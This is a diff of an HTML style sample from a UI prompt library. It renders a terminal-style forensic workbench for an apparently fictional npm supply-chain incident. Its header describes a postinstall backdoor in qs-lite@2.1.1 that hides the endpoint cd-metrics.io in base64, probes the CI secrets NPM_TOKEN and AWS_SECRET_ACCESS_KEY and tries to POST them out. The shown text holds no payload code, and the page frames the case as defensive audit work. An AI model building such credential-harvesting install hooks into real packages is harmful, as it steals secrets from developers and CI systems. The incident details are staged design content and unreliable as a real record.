@@ -4,167 +4,707 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="icon" type="image/svg+xml" href="../favicon.svg">
-<title>取证工作台 / 内容排版风格 — UI 设计提示词库</title>
-<meta name="description" content="UI 设计提示词库 / 内容排版风格样张与官方提示词，复制后交给 AI 复刻同款网页。">
+<title>取证工作台 Developer Workbench / UI 设计提示词库</title>
+<meta name="description" content="UI 设计提示词库 / 内容排版样张：取证工作台，开源依赖审计的代码取证台，供应链投毒的完整证据链。">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap');
 
+/* token 计划: bg #101418 / panel #161C22 / ink #D7DEE8 / muted #8494A3 与 dim #7A8B9C(自 #71818F 提亮保 4.5:1) / accent #4FC3F7 / line #2A333D / 语义色 ERR #FF7B72 / WARN #E3B341 / OK #3FB950 / HYP #D2A8FF / 全等宽 JetBrains Mono / radius 4px / 布局: tmux 式 pane 密集工作台 */
 :root {
-  --bg: #101418; --panel: #161C22; --ink: #D7DEE8; --muted: #71818F;
-  --accent: #4FC3F7; --line: #2A333D; --radius: 4px;
-  --fh: 'JetBrains Mono', 'PingFang SC', 'Microsoft YaHei', serif;
-  --fb: 'JetBrains Mono', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+  --bg: #101418;
+  --panel: #161C22;
+  --panel-hi: #1A222B;
+  --ink: #D7DEE8;
+  --muted: #8494A3;
+  --dim: #7A8B9C;
+  --accent: #4FC3F7;
+  --line: #2A333D;
+  --err: #FF7B72;
+  --warn: #E3B341;
+  --ok: #3FB950;
+  --hyp: #D2A8FF;
+  --radius: 4px;
+  --mono: 'JetBrains Mono', Consolas, Menlo, monospace;
 }
+
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: var(--fb); background: var(--bg); color: var(--ink); line-height: 1.65; padding: 44px 22px 70px; }
-.wrap { max-width: 860px; margin: 0 auto; }
-.back { display: inline-block; font-size: 13.5px; font-weight: 600; color: var(--ink); text-decoration: none; border: 2px solid var(--ink); border-radius: 999px; padding: 6px 16px; margin-bottom: 26px; background: var(--panel); box-shadow: 3px 3px 0 var(--ink); }
-.back:hover { transform: translate(-1px,-1px); }
-.back:focus-visible { outline: 3px solid var(--accent); outline-offset: 3px; }
-.kicker { font-size: 13px; font-weight: 600; color: var(--accent); }
-h1 { font-family: var(--fh); font-size: clamp(30px, 6vw, 44px); line-height: 1.15; margin: 4px 0 10px; }
-.sub { color: var(--muted); font-size: 15px; max-width: 640px; }
-.meta { margin: 14px 0 6px; font-size: 13px; color: var(--muted); border-top: 1.5px dashed var(--line); border-bottom: 1.5px dashed var(--line); padding: 10px 2px; }
-.meta code { font-family: 'JetBrains Mono', Consolas, monospace; font-size: 12px; color: var(--ink); }
-h2 { font-family: var(--fh); font-size: 19px; margin: 34px 0 12px; }
-.steps { list-style: none; display: grid; gap: 10px; }
-.steps li { display: grid; grid-template-columns: 34px 1fr; gap: 10px; align-items: baseline; }
-.steps b { font-size: 15px; color: var(--accent); font-variant-numeric: tabular-nums; }
-.steps span { font-size: 14.5px; }
-.vocab { font-family: 'JetBrains Mono', Consolas, monospace; font-size: 12.5px; color: var(--muted); background: var(--panel); border: 1.5px dashed var(--line); border-radius: 8px; padding: 10px 14px; word-break: break-word; }
-.note { margin-top: 40px; font-size: 13px; color: var(--muted); }
-.note a { color: var(--accent); font-weight: 600; }
 
-.hx { border: 2.5px solid var(--ink); border-radius: var(--radius); background: var(--panel); padding: clamp(26px, 5vw, 46px); margin: 4px 0 30px; box-shadow: 6px 6px 0 rgba(0,0,0,.06); }
-.hx b { font-size: 1.06em; }
-.hx b { font-family: var(--fh); }
-.tl { border-left: 3px solid var(--a); padding-left: 18px; display: grid; gap: 14px; }
-.tl-node { position: relative; }
-.tl-node i { position: absolute; left: -24.5px; top: 5px; width: 11px; height: 11px; border-radius: 50%; background: var(--a); border: 2.5px solid var(--ink); }
-.tl-card b { display: block; font-size: 15px; }
-.tl-card span { color: var(--muted); font-size: 13px; }
-.grid3 { display: grid; grid-template-columns: 1fr 1.6fr 1fr; gap: 12px; }
-.grid3 .p { border: 1.5px solid var(--l); border-radius: 8px; padding: 12px; display: grid; gap: 6px; align-content: start; }
-.grid3 .mini span, .grid3 .stage b { font-size: 12.5px; color: var(--muted); }
-.grid3 .stage { align-items: center; justify-items: center; }
-.essayh { display: grid; grid-template-columns: 44px 1fr; gap: 18px; align-items: start; }
-.capsule { writing-mode: vertical-rl; font-size: 12.5px; letter-spacing: .35em; color: var(--a); border: 1.5px solid var(--a); border-radius: 999px; padding: 14px 8px; }
-.essayh p { font-size: 16.5px; line-height: 2; margin: 0; }
-.spore { border-bottom: 2px solid var(--a); font-weight: 700; }
-.kpis { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 14px; }
-.kpi { border: 1.5px solid var(--l); border-radius: 8px; padding: 10px 12px; }
-.kpi b { font-size: 24px; font-variant-numeric: tabular-nums; display: block; }
-.kpi span { font-size: 12px; color: var(--muted); }
-.bars { display: flex; align-items: flex-end; gap: 8px; height: 64px; }
-.bars i { flex: 1; background: var(--a); border-radius: 3px 3px 0 0; opacity: .85; }
-.saash { display: grid; grid-template-columns: 1fr 1.8fr 1fr; gap: 12px; }
-.saash .p { border: 1.5px solid var(--l); border-radius: 14px; padding: 12px; font-size: 13px; display: grid; gap: 8px; align-content: start; }
-.saash .big svg { width: 100%; height: 48px; }
-.dot { width: 8px; height: 8px; border-radius: 50%; background: var(--a); display: inline-block; margin-right: 6px; }
-.dot.ok { background: #2FA463; }
-.saash .p b { font-variant-numeric: tabular-nums; }
-.lanes { display: grid; gap: 10px; }
-.lane { display: grid; grid-template-columns: 44px 1fr auto; align-items: center; border: 2px solid var(--ink); border-radius: 6px; padding: 10px 14px; gap: 10px; }
-.lane .rank { font-size: 22px; font-weight: 800; }
-.lane em { font-size: 20px; font-style: normal; font-weight: 800; color: var(--a); font-variant-numeric: tabular-nums; }
-.atlas svg { width: 100%; height: auto; }
-.atlas .drawer { border: 1.5px solid var(--l); border-radius: 8px; padding: 8px 12px; font-size: 13px; color: var(--muted); margin-top: 10px; }
-.travel .dots { display: grid; grid-template-columns: repeat(20, 1fr); gap: 5px; }
-.travel .dots i { aspect-ratio: 1; border-radius: 50%; background: var(--a); opacity: .3; }
-.travel .dots i:nth-child(3n) { opacity: .8; }
-.runway { display: flex; gap: 26px; margin-top: 14px; }
-.runway b { font-size: 26px; display: block; font-variant-numeric: tabular-nums; }
-.runway span { font-size: 12px; color: var(--muted); }
-.net svg { width: 100%; height: auto; }
-.doch .mast { border-bottom: 2.5px solid var(--a); padding-bottom: 8px; }
-.doch .mast b { font-size: 17px; display: block; }
-.doch .mast span { font-size: 12.5px; color: var(--muted); }
-.doch .rail { margin: 10px 0; font-size: 13px; color: var(--a); }
-.doch p { margin: 0; font-size: 15px; }
-.kamih { text-align: center; }
-.kamih small { letter-spacing: .3em; font-size: 11px; color: var(--muted); }
-.kamih b { display: block; font-size: clamp(24px, 5vw, 34px); margin: 6px 0; }
-.inkline { display: block; width: 56px; height: 3px; background: var(--a); margin: 10px auto 12px; }
-.kamih span { font-size: 13px; color: var(--muted); }
-.spreadh { display: grid; grid-template-columns: 1fr 1fr; min-height: 220px; border: none; padding: 0; background: none; }
-.spreadh .bay, .spreadh .panel { display: grid; place-items: center; border: 2.5px solid var(--ink); }
-.spreadh .bay { border-right: none; border-radius: var(--radius) 0 0 var(--radius); }
-.spreadh .panel { border-radius: 0 var(--radius) var(--radius) 0; text-align: left; align-content: center; gap: 8px; padding: 20px; }
-.spreadh .panel small { font-size: 11px; letter-spacing: .25em; color: var(--muted); }
-.spreadh .panel b { font-size: clamp(20px, 4vw, 30px); font-style: italic; }
-.spreadh .panel span { font-size: 12px; }
-.eguideh { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-.eguideh .pg { border: 1.5px solid var(--l); border-radius: 4px; padding: 16px; display: grid; gap: 8px; align-content: start; aspect-ratio: 3/4; }
-.eguideh small { font-size: 10.5px; letter-spacing: .2em; color: var(--muted); }
-.eguideh .cover b { font-size: clamp(18px, 3.4vw, 26px); line-height: 1.2; }
-.eguideh span { font-size: 12px; color: var(--muted); }
-.carouselh { display: flex; gap: 12px; overflow: hidden; }
-.carouselh .sl { flex: 0 0 31%; aspect-ratio: 4/5; border: 2px solid var(--ink); border-radius: 8px; padding: 14px; display: grid; align-content: end; gap: 8px; }
-.carouselh .sl em { font-size: 34px; font-style: normal; font-weight: 800; color: var(--a); align-self: start; }
-.carouselh .sl span { font-size: 13px; font-weight: 600; }
-.carouselh .ghost { opacity: .35; }
-.termh { font-family: 'JetBrains Mono', Consolas, monospace; background: var(--p); color: #C8E6C9; border-color: var(--l); font-size: 13px; }
-.termh .prompt b, .termh b { color: inherit; font-family: inherit; }
-.termh .prompt { color: #9FE8B0; }
-.termh .cur { animation: blink 1.1s steps(1) infinite; color: var(--a); }
-@keyframes blink { 50% { opacity: 0; } }
-.termh .rail2 { display: flex; gap: 16px; flex-wrap: wrap; margin: 10px 0; color: #8FB99A; }
-.termh .pane { border: 1px solid var(--a); padding: 10px 12px; line-height: 1.7; }
-.briefh .chips { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
-.briefh .chips i { font-style: normal; font-size: 12px; border: 1.5px solid var(--l); border-radius: 999px; padding: 4px 12px; color: var(--muted); }
-.briefh .main { border: 1.5px solid var(--l); border-radius: 12px; padding: 16px; display: grid; gap: 6px; }
-.briefh .main b { font-size: 16px; }
-.briefh .main span { font-size: 12.5px; color: var(--muted); }
-.keeph { display: grid; grid-template-columns: 70px 1fr 1fr; gap: 14px; align-items: center; }
-.keeph .heart { width: 100%; filter: drop-shadow(0 6px 12px rgba(232,93,138,.35)); }
-.keeph .kt b { font-size: 22px; display: block; }
-.keeph .kt span { font-size: 12.5px; color: var(--muted); }
-@media (max-width: 640px) {
-  .grid3, .saash, .spreadh, .eguideh { grid-template-columns: 1fr; }
-  .keeph { grid-template-columns: 56px 1fr 1fr; }
+html { scrollbar-color: #3A4652 var(--bg); }
+
+body {
+  font-family: var(--mono), 'PingFang SC', 'Microsoft YaHei', monospace;
+  background: var(--bg);
+  color: var(--ink);
+  line-height: 1.65;
+  font-size: 14px;
 }
-.lens { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 22px; }
-.lens b { font-size: clamp(26px, 5vw, 40px); display: block; font-variant-numeric: tabular-nums; }
-.lens span { font-size: 12.5px; color: var(--muted); }
-.rhythm { display: flex; align-items: flex-end; gap: 6px; height: 44px; margin-top: 22px; }
-.rhythm i { flex: 1; background: var(--a); opacity: .75; border-radius: 3px 3px 0 0; }
-.flags { display: flex; gap: 14px; flex-wrap: wrap; margin-top: 14px; font-size: 13px; color: var(--muted); }
-.fl { display: inline-flex; align-items: center; gap: 6px; }
-.fdot { width: 9px; height: 9px; border-radius: 50%; background: var(--a); }
-.fdot.warn { background: #C77D2B; }
-.fdot.ok { background: #2FA463; }
-.panes { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-.termh .pane { margin: 0; }
-.tl-grow { animation: tl-grow 900ms ease-out both; transform-origin: top; }
-@keyframes tl-grow { from { clip-path: inset(0 0 100% 0); } to { clip-path: inset(0 0 0 0); } }
-.hx { animation: hx-rise 700ms ease-out both; }
-@keyframes hx-rise { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: none; } }
-@media (prefers-reduced-motion: reduce) { .termh .cur, .tl-grow, .hx { animation: none; } }
 
+::selection { background: var(--accent); color: #06222F; }
+
+:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: var(--radius); }
+
+.wrap { max-width: 1120px; margin: 0 auto; padding: 44px 20px 72px; }
+
+/* ============ 页头（案例档案门面） ============ */
+.kicker { font-size: 12.5px; color: var(--accent); letter-spacing: .04em; }
+h1 { font-size: clamp(22px, 4.4vw, 36px); line-height: 1.3; margin: 8px 0 12px; font-weight: 700; }
+.standfirst { color: var(--muted); font-size: 14px; max-width: 760px; }
+.head-meta {
+  margin: 16px 0 30px; font-size: 12.5px; color: var(--dim);
+  border-top: 1px dashed var(--line); border-bottom: 1px dashed var(--line);
+  padding: 9px 2px;
+}
+.head-meta b { color: var(--ink); font-weight: 500; }
+.head-meta .hm-hyp { color: var(--hyp); font-weight: 700; }
+
+/* ============ 取证工作台窗 ============ */
+.bench {
+  border: 1px solid var(--line);
+  border-radius: var(--radius);
+  background: var(--panel);
+  box-shadow: 0 24px 48px rgba(0, 0, 0, .45);
+  overflow: hidden;
+}
+
+/* 窗口标题条 */
+.win-title {
+  display: flex; justify-content: space-between; gap: 16px; flex-wrap: wrap;
+  padding: 8px 16px; font-size: 12px; color: var(--dim);
+  border-bottom: 1px solid var(--line); background: var(--panel-hi);
+}
+.win-title b { color: var(--muted); font-weight: 500; }
+
+/* ============ 1 命令/发现栏: prompt + 状态 + 疑似原因 + 涉改文件 + 置信标签 ============ */
+.finding-bar { padding: 18px 18px 14px; border-bottom: 1px solid var(--line); }
+.prompt-line { font-size: 14px; white-space: pre-wrap; word-break: break-all; }
+.prompt { color: var(--accent); font-weight: 700; }
+.cmd-text { color: var(--ink); }
+.finding-grid {
+  display: grid; grid-template-columns: 1.5fr 1.3fr 1fr;
+  gap: 1px; background: var(--line); border: 1px solid var(--line);
+  margin-top: 14px;
+}
+.f-cell { background: var(--panel); padding: 12px 14px; min-width: 0; }
+.f-label { font-size: 11.5px; color: var(--dim); margin-bottom: 6px; }
+.f-main { font-size: 14.5px; font-weight: 700; color: var(--ink); }
+.f-main .fm-hyp { color: var(--hyp); }
+.f-sub { font-size: 12.5px; color: var(--muted); margin-top: 5px; overflow-wrap: anywhere; }
+.f-status { margin-top: 8px; font-size: 12px; color: var(--dim); }
+.f-status b { color: var(--ok); font-weight: 500; }
+.f-files { list-style: none; display: grid; gap: 4px; font-size: 12.5px; }
+.f-files li { display: grid; grid-template-columns: minmax(0, 1fr); gap: 0 8px; }
+.f-files .fp { color: var(--ink); overflow-wrap: anywhere; }
+.f-files .fn { color: var(--dim); font-size: 11.5px; }
+.f-tags { list-style: none; display: grid; gap: 6px; font-size: 12.5px; }
+.f-tags li { display: grid; grid-template-columns: 6ch 1fr; gap: 0 8px; align-items: baseline; }
+.f-tags .ft-t { font-weight: 700; }
+.f-tags .ft-x { color: var(--muted); overflow-wrap: anywhere; }
+.f-meta { margin-top: 10px; font-size: 12px; color: var(--dim); }
+.f-meta b { color: var(--muted); font-weight: 400; }
+
+/* ============ pane 通用: 标题条 + 可折叠 ============ */
+.pane-zone { padding: 14px 18px 16px; border-bottom: 1px solid var(--line); }
+.zone-label { font-size: 11.5px; color: var(--dim); margin-bottom: 10px; }
+.pane {
+  background: var(--panel); min-width: 0; display: flex; flex-direction: column;
+  border: 1px solid var(--line); border-radius: var(--radius);
+}
+.pane-title {
+  display: flex; align-items: center; gap: 8px;
+  padding: 7px 10px; font-size: 12.5px;
+  background: var(--panel-hi); border-bottom: 1px solid var(--line);
+}
+.pt-sq { width: 7px; height: 7px; flex: none; background: var(--accent); }
+.pt-name { color: var(--ink); font-weight: 500; }
+.pt-meta { color: var(--dim); font-size: 11.5px; margin-left: auto; white-space: nowrap; }
+.pt-toggle {
+  font: inherit; font-size: 12px; color: var(--muted); background: none;
+  border: 1px solid var(--line); border-radius: var(--radius);
+  padding: 0 6px; cursor: pointer; line-height: 1.6; flex: none;
+}
+.pt-toggle:hover { color: var(--accent); border-color: var(--accent); }
+.pt-toggle:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }
+.pane-body { padding: 12px 14px 14px; font-size: 13px; min-width: 0; }
+.pane.is-collapsed .pane-body { display: none; }
+.pane.is-collapsed .pane-title { border-bottom-color: transparent; }
+
+/* ============ 2 风险清单: [ERR][WARN][OK][HYP] 按严重度 + grep 过滤 ============ */
+.grep {
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+  padding: 8px 10px; margin-bottom: 10px;
+  border: 1px dashed var(--line); border-radius: var(--radius);
+}
+.grep-label { color: var(--accent); font-weight: 700; font-size: 12.5px; }
+.grep-input {
+  flex: 1; min-width: 160px; font: inherit; font-size: 12.5px;
+  color: var(--ink); background: var(--bg); caret-color: var(--accent);
+  border: 1px solid var(--line); border-radius: var(--radius); padding: 4px 8px;
+}
+.grep-input::placeholder { color: var(--dim); }
+.grep-input:hover { border-color: var(--accent); }
+.grep-count { color: var(--dim); font-size: 11.5px; white-space: nowrap; }
+.risk-checklist { list-style: none; }
+.ck {
+  display: grid; grid-template-columns: 6ch 5ch minmax(0, 1fr) minmax(12ch, max-content);
+  gap: 2px 12px; padding: 6px 8px; align-items: baseline;
+  border-radius: var(--radius);
+}
+.ck + .ck { border-top: 1px dashed var(--line); }
+.ck:hover { background: rgba(79, 195, 247, .05); }
+.ck-tag { font-weight: 700; font-size: 12.5px; }
+.ck-id { color: var(--dim); font-size: 12px; }
+.ck-tx { color: var(--muted); font-size: 13px; overflow-wrap: anywhere; }
+.ck-tx b { color: var(--ink); font-weight: 500; }
+.ck-tx .tx-err { color: var(--err); }
+.ck-tx .tx-warn { color: var(--warn); }
+.ck-tx .tx-ok { color: var(--ok); }
+.ck-loc { color: var(--dim); font-size: 11.5px; text-align: right; white-space: nowrap; }
+.ck.is-hidden { display: none; }
+.tag-err { color: var(--err); }
+.tag-warn { color: var(--warn); }
+.tag-ok { color: var(--ok); }
+.tag-hyp { color: var(--hyp); }
+
+/* ============ 3 pane 网格: tmux 式 1px 分隔 ============ */
+.pane-grid { display: grid; gap: 10px; }
+.pane-grid-a { grid-template-columns: 3fr 2fr; }
+.pane-grid-b { grid-template-columns: 1fr 1.15fr 1fr; }
+
+/* diff pane: 双行号列 + 增删染色 + 一次扫光 */
+.diff-file {
+  display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap;
+  font-size: 12px; color: var(--dim); margin-bottom: 8px;
+}
+.diff-file .df-path { color: var(--muted); overflow-wrap: anywhere; }
+.diff-file .df-stat { white-space: nowrap; }
+.diff-file .ds-add { color: var(--ok); font-weight: 700; }
+.diff-file .ds-del { color: var(--err); font-weight: 700; }
+.diff-scroll { overflow-x: auto; scrollbar-width: thin; }
+.diff-table { position: relative; min-width: max-content; font-size: 12.5px; }
+.dl {
+  display: grid; grid-template-columns: 4ch 4ch 2ch minmax(max-content, 1fr);
+  white-space: pre; line-height: 1.7;
+}
+.dl .ln { text-align: right; color: var(--dim); padding-right: 3px; user-select: none; position: sticky; background: var(--panel); }
+.dl .ln-old { left: 0; z-index: 2; }
+.dl .ln-new { left: 4ch; z-index: 2; }
+.dl .mk { color: var(--dim); }
+.dl .tx { color: var(--ink); }
+.dl-hunk { color: var(--accent); background: rgba(79, 195, 247, .06); }
+.dl-hunk .mk { color: var(--accent); }
+.dl-add { background: rgba(63, 185, 80, .12); }
+.dl-add .mk { color: var(--ok); font-weight: 700; }
+.dl-add .ln { color: var(--ink); }
+.dl-del { background: rgba(255, 123, 114, .10); }
+.dl-del .mk { color: var(--err); font-weight: 700; }
+.dl-del .ln { color: var(--ink); }
+/* 一次亮相: 扫光沿 diff 行自上而下掠过一次 */
+.diff-table::after {
+  content: ""; position: absolute; left: 0; right: 0; top: 0; height: 46%;
+  background: linear-gradient(180deg, transparent, rgba(79, 195, 247, .18), transparent);
+  pointer-events: none;
+  animation: diff-sweep 1.5s cubic-bezier(.4, 0, .2, 1) .3s both;
+}
+@keyframes diff-sweep {
+  from { transform: translateY(-110%); }
+  to { transform: translateY(240%); }
+}
+.diff-note { margin-top: 10px; font-size: 11.5px; color: var(--dim); border-top: 1px dashed var(--line); padding-top: 8px; }
+
+/* stack pane: 沙箱重放堆栈帧 */
+.run-cmd { font-size: 12px; color: var(--muted); margin-bottom: 8px; overflow-x: auto; white-space: pre; }
+.run-cmd .rc-p { color: var(--accent); }
+.err-head { font-size: 12.5px; color: var(--err); background: rgba(255, 123, 114, .08); padding: 8px 10px; border-radius: var(--radius); overflow-wrap: anywhere; margin-bottom: 10px; }
+.err-head .eh-ctx { color: var(--ink); }
+.frames { list-style: none; }
+.frames .fh {
+  display: grid; grid-template-columns: 4ch minmax(11ch, max-content) minmax(0, 1fr);
+  gap: 0 12px; font-size: 12px; color: var(--dim);
+  border-bottom: 1px dashed var(--line); padding-bottom: 4px; margin-bottom: 5px;
+}
+.frames .fr {
+  display: grid; grid-template-columns: 4ch minmax(11ch, max-content) minmax(0, 1fr);
+  gap: 0 12px; font-size: 12.5px; padding: 2px 0; align-items: baseline;
+}
+.frames .fr .fi { color: var(--dim); text-align: right; }
+.frames .fr .fn { color: var(--muted); overflow-wrap: anywhere; }
+.frames .fr .fl { color: var(--dim); overflow-wrap: anywhere; white-space: pre; }
+.frames .fr.hot .fn, .frames .fr.hot .fi { color: var(--warn); }
+.frames .fr.hot .fl { color: var(--ink); }
+.stack-note { margin-top: 10px; font-size: 11.5px; color: var(--dim); border-top: 1px dashed var(--line); padding-top: 8px; }
+.stack-note b { color: var(--ok); font-weight: 500; }
+
+/* dep chain pane */
+.chain { list-style: none; }
+.chain li {
+  display: grid; grid-template-columns: 5ch minmax(0, 1fr);
+  gap: 0 6px; font-size: 12.5px; padding: 2px 0; align-items: baseline;
+}
+.chain .cm { color: var(--dim); white-space: pre; user-select: none; }
+.chain .cx { color: var(--muted); overflow-wrap: anywhere; }
+.chain .cx b { color: var(--ink); font-weight: 500; }
+.chain .cx.hot b { color: var(--err); }
+.chain-foot { margin-top: 10px; font-size: 11.5px; color: var(--dim); border-top: 1px dashed var(--line); padding-top: 8px; }
+
+/* publish trail pane */
+.trail { list-style: none; }
+.trail li {
+  display: grid; grid-template-columns: 14ch minmax(0, 1fr);
+  gap: 0 10px; font-size: 12.5px; padding: 3px 0; align-items: baseline;
+}
+.trail + .trail { margin-top: 0; }
+.trail .tt { color: var(--dim); font-variant-numeric: tabular-nums; }
+.trail .tx { color: var(--muted); overflow-wrap: anywhere; }
+.trail .tx b { color: var(--ink); font-weight: 500; }
+.trail li.hot .tx b { color: var(--err); }
+
+/* pipeline exposure pane */
+.expo { list-style: none; }
+.expo li {
+  display: grid; grid-template-columns: minmax(13ch, auto) minmax(9ch, auto) 6.5ch minmax(0, 1fr);
+  gap: 0 10px; font-size: 12.5px; padding: 4px 0; align-items: baseline;
+}
+.expo .ep { color: var(--ink); overflow-wrap: anywhere; }
+.expo .et { color: var(--dim); }
+.expo .er { white-space: nowrap; }
+.expo .ex { color: var(--muted); overflow-wrap: anywhere; }
+.expo .er.ran-yes { color: var(--err); }
+.expo .er.ran-no { color: var(--ok); }
+.expo .er.ran-part { color: var(--warn); }
+.expo-foot { margin-top: 10px; font-size: 11.5px; color: var(--dim); border-top: 1px dashed var(--line); padding-top: 8px; }
+
+/* ============ 4 可复制交接: 结论块 + 括号按钮 ============ */
+.copy-btn {
+  font: inherit; font-size: 12px; font-weight: 700; letter-spacing: .02em;
+  color: var(--accent); background: var(--bg);
+  border: 1px solid var(--accent); border-radius: var(--radius);
+  padding: 2px 10px; cursor: pointer; white-space: nowrap; flex: none;
+}
+.copy-btn:hover { background: var(--accent); color: #06222F; }
+.copy-btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+.copy-btn.copied { background: var(--accent); color: #06222F; }
+.copy-btn.failed { color: var(--err); border-color: var(--err); background: var(--bg); }
+.handoff-text {
+  font-family: inherit; font-size: 12.5px; line-height: 1.8; color: var(--muted);
+  white-space: pre-wrap; overflow-wrap: anywhere;
+  background: var(--bg); border: 1px solid var(--line); border-radius: var(--radius);
+  padding: 12px 14px;
+}
+.handoff-text b { color: var(--ink); font-weight: 700; }
+.handoff-note { margin-top: 8px; font-size: 11.5px; color: var(--dim); }
+
+/* 工作台状态底栏 */
+.bench-status {
+  display: flex; justify-content: space-between; gap: 14px; flex-wrap: wrap;
+  background: var(--accent); color: #06222F; font-size: 12px; font-weight: 700;
+  padding: 6px 16px;
+}
+.bench-status .bs-right { font-weight: 500; }
+
+/* ============ footer ============ */
+.page-foot {
+  margin-top: 34px; padding-top: 16px; border-top: 1px dashed var(--line);
+  display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap;
+  font-size: 12.5px; color: var(--dim);
+}
+.page-foot a { color: var(--accent); text-decoration: none; border-bottom: 1px solid var(--line); padding-bottom: 1px; }
+.page-foot a:hover { border-bottom-color: var(--accent); }
+
+/* ============ 响应式 375 / 768 / 1440 ============ */
+@media (max-width: 960px) {
+  .pane-grid-a { grid-template-columns: 1fr; }
+  .pane-grid-b { grid-template-columns: 1fr 1fr; }
+  .pane-grid-b .pane:last-child { grid-column: 1 / -1; }
+  .finding-grid { grid-template-columns: 1fr 1fr; }
+  .finding-grid .f-cell:last-child { grid-column: 1 / -1; }
+}
+@media (max-width: 640px) {
+  body { font-size: 13px; }
+  .wrap { padding: 30px 12px 56px; }
+  .pane-grid-b { grid-template-columns: 1fr; }
+  .pane-grid-b .pane:last-child { grid-column: auto; }
+  .finding-grid { grid-template-columns: 1fr; }
+  .finding-bar, .pane-zone { padding-left: 12px; padding-right: 12px; }
+  .ck { grid-template-columns: 6ch minmax(0, 1fr); }
+  .ck-id { display: none; }
+  .ck-loc { grid-column: 2; text-align: left; white-space: normal; }
+  .expo li { grid-template-columns: minmax(0, 1fr) 6.5ch; }
+  .expo .et { display: none; }
+  .expo .ex { grid-column: 1 / -1; padding-left: 0; }
+  .trail li { grid-template-columns: minmax(0, 1fr); }
+  .trail .tt { color: var(--muted); }
+  .prompt-line { font-size: 12.5px; }
+}
+
+/* reduced-motion: 扫光降级为直接静止 */
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation: none !important; transition: none !important; }
+}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <a class="back" href="../style-catalog.html">← 返回风格目录</a>
-  <p class="kicker">内容排版风格 / Developer Workbench</p>
-  <h1>取证工作台</h1>
-  <p class="sub">终端取证工作台：像 tmux 分屏的事故控制台，可审计、扫读快。GitHub 仓库、diff、PR 补丁、CI/构建/测试日志、堆栈跟踪等技术工件。</p>
-  <p class="meta">本页 token：<code>底 #101418</code> <code>面板 #161C22</code> <code>主字 #D7DEE8</code> <code>强调 #4FC3F7</code> <code>圆角 4px</code> / 标题 <code>JetBrains Mono</code> / 正文 <code>JetBrains Mono</code> / 动效：diff 行一次高亮扫过</p>
 
-  <h2>结构示意</h2>
-  <div class="hx termh" style="--a:#4FC3F7;--p:#161C22;--l:#2A333D">
-  <div class="prompt">review@kindle:~$ audit highlights.csv<span class="cur">▌</span></div>
-  <div class="rail2"><span>[ERR] 未标注 14 条</span><span>[WARN] 重复 3 条</span><span>[OK] 导出可用</span></div>
-  <div class="pane">diff 高亮行 / 堆栈帧 / 交接结论块</div>
+  <header class="page-head">
+    <p class="kicker">依赖审计记录 / acme/checkout-web / 2026-10-09</p>
+    <h1>15 分钟后的第二发：锁定 qs-lite@2.1.1 的 postinstall 后门</h1>
+    <p class="standfirst">一次例行 lockfile 巡检在 PR #4821 停了下来：qs-lite 的新维护者在干净的 2.1.0 发布 15 分钟后推出 2.1.1，把原本只回显系统信息的 setup.js 换成读取 CI 凭据指纹的 beacon。以下是在隔离工作台上留下的可审计证据：按严重度排序的风险清单、原始 diff、沙箱重放堆栈与可粘贴的交接结论。</p>
+    <p class="head-meta">incident-2257 / 严重度 <b>2</b> / 状态 <b>已隔离</b> / 审计员 <b>auditor</b> / 判定 <span class="hm-hyp">[HYP] 供应链投毒</span> / 置信 <b>0.83</b></p>
+  </header>
+
+  <main class="bench" id="bench">
+
+    <div class="win-title">
+      <span>auditor@workbench:~/audit/checkout-web</span>
+      <b>tmux session forensic-2257 / 7 panes / 172x48</b>
+    </div>
+
+    <!-- 1 命令/发现栏 -->
+    <section class="finding-bar" aria-label="命令与发现栏">
+      <div class="prompt-line"><span class="prompt">auditor@workbench:~/audit/checkout-web$ </span><span class="cmd-text">osv-scanner --lock package-lock.json --diff 4c9e1f2..HEAD --deep --format workbench</span></div>
+      <div class="finding-grid">
+        <div class="f-cell">
+          <p class="f-label">状态与疑似原因</p>
+          <p class="f-main"><span class="fm-hyp">[HYP] 疑似供应链后门</span> / qs-lite@2.1.1</p>
+          <p class="f-sub">postinstall 以 base64 隐匿外发端点 cd-metrics.io，install 期读取凭据指纹（布尔探测 NPM_TOKEN 与 AWS_SECRET_ACCESS_KEY）并尝试 POST。</p>
+          <p class="f-status">处置: <b>已 pin 回 2.1.0</b> / CI 凭据轮换中 / egress 已封禁该域名</p>
+        </div>
+        <div class="f-cell">
+          <p class="f-label">涉改文件</p>
+          <ul class="f-files">
+            <li><span class="fp">package-lock.json</span><span class="fn">qs-lite 2.1.0 -&gt; 2.1.1 / PR #4821 / commit 4c9e1f2</span></li>
+            <li><span class="fp">node_modules/qs-lite/scripts/setup.js</span><span class="fn">+20 -4 / 沙箱副本已固化取证</span></li>
+            <li><span class="fp">package.json</span><span class="fn">声明 ^2.1.0 未变 / 声明面无异常</span></li>
+          </ul>
+        </div>
+        <div class="f-cell">
+          <p class="f-label">置信标签</p>
+          <ul class="f-tags">
+            <li><span class="ft-t tag-hyp">[HYP]</span><span class="ft-x">后门定性 0.83 / 待 registry 侧日志补证</span></li>
+            <li><span class="ft-t tag-err">[ERR]</span><span class="ft-x">凭据指纹读取已在沙箱确认</span></li>
+            <li><span class="ft-t tag-warn">[WARN]</span><span class="ft-x">发布源异常 / 账号域龄 8 天</span></li>
+          </ul>
+        </div>
+      </div>
